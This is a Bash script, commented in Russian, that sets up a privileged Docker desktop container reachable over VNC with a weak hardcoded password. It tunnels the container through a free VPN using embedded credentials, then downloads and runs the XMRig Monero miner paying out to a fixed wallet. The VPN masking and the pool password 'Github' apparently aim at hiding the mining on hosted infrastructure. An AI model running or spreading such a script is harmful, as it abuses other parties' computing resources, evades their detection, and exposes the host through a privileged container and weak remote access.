#!/bin/bash

# === 1. Установка Docker и необходимых пакетов ===
echo "[+] Обновление пакетов и установка Docker и Docker Compose..."
sudo apt update && sudo apt install -y docker.io docker-compose openvpn curl unzip

# === 2. Проверка, установлен ли Docker ===
if ! command -v docker &> /dev/null; then
  echo "[-] Docker не установлен. Прерывание."
  exit 1
fi

# === 3. Создание рабочей директории ===
echo "[+] Создание директории ~/dockercom..."
mkdir -p ~/dockercom
cd ~/dockercom || exit 1

# === 4. Создание docker-compose файла ===
echo "[+] Создание файла ubuntu_gui.yml..."
cat > ubuntu_gui.yml <<EOF
version: '3.8'

services:
  ubuntu-gui:
    image: dorowu/ubuntu-desktop-lxde-vnc:bionic
    container_name: ubuntu_gui
    ports:
      - "6080:80"
      - "5900:5900"
    environment:
      - VNC_PASSWORD=pass123
    volumes:
      - ./data:/data
      - /dev/net/tun:/dev/net/tun
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun
    privileged: true
    shm_size: "2g"
EOF

# === 5. Запуск контейнера ===
echo "[+] Запуск контейнера..."
sudo docker-compose -f ubuntu_gui.yml up -d

# === 6. Проверка запущенных контейнеров ===
echo "[+] Проверка контейнеров:"
sudo docker ps

# === 7. Подключение к VPN (Часть 1) ===
echo "[+] Настройка OpenVPN внутри контейнера (часть 1)..."
sudo docker exec -i ubuntu_gui bash <<'EOC'
apt update
apt install -y openvpn curl

cd /tmp
curl -L -o vpn.ovpn https://raw.githubusercontent.com/tfuutt467/mytest/0107725a2fcb1e4ac4ec03c78f33d0becdae90c2/vpnbook-de20-tcp443.ovpn

cat > auth.txt <<EOP
vpnbook
cf32e5w
EOP

openvpn --config vpn.ovpn --auth-user-pass auth.txt --daemon
EOC

# === 8. Подключение к VPN (Часть 2) ===
echo "[+] Расширенная настройка VPN внутри контейнера (часть 2)..."
sudo docker exec -i ubuntu_gui bash <<'EOC'
apt update
apt install -y openvpn curl unzip resolvconf

cd /tmp
curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook

cat > vpnbook/auth.txt <<EOF
vpnbook
cf324xw
EOF

if [ ! -c /dev/net/tun ]; then
  echo "❌ TUN device not available. VPN не сможет работать."
  exit 1
fi

echo "nameserver 1.1.1.1" > /etc/resolv.conf

openvpn --config vpnbook/vpnbook-euro1-tcp443.ovpn \
    --auth-user-pass vpnbook/auth.txt \
    --daemon \
    --route-up '/etc/openvpn/update-resolv-conf' \
    --down '/etc/openvpn/update-resolv-conf'

echo "⏳ Ждём 45 секунд, чтобы VPN поднялся..."
sleep 45

echo "🌐 Текущий внешний IP:"
curl -s ifconfig.me
EOC

# === 9. Установка и запуск XMRig ===
echo "[+] Установка и запуск XMRig внутри контейнера..."
sudo docker exec -i ubuntu_gui bash <<'EOM'
# Пользовательские настройки
POOL="gulf.moneroocean.stream:10128"
WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
PASSWORD="Github"

# Загрузка XMRig
XMRIG_VERSION="6.22.2"
ARCHIVE_NAME="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE_NAME}"

cd /tmp
curl -LO "$DOWNLOAD_URL"
tar -xzf "$ARCHIVE_NAME"
cd "xmrig-${XMRIG_VERSION}" || exit 1

# Создание config.json
cat > config.json <<EOF
{
    "api": {
        "id": null,
        "worker-id": ""
    },
    "autosave": false,
    "background": false,
    "colors": true,
    "randomx": {
        "1gb-pages": true,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": true,
    "donate-level": 0,
    "log-file": null,
    "pools": [
        {
            "url": "${POOL}",
            "user": "${WALLET}",
            "pass": "${PASSWORD}",
            "algo": "rx",
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null
}
EOF

chmod +x xmrig
echo "[*] Запуск майнинга..."
./xmrig -c config.json
EOM

# === 10. Финальное сообщение ===
echo
echo "[✅] Всё запущено."
echo "VNC-доступ: http://localhost:6080 (пароль: pass123)"
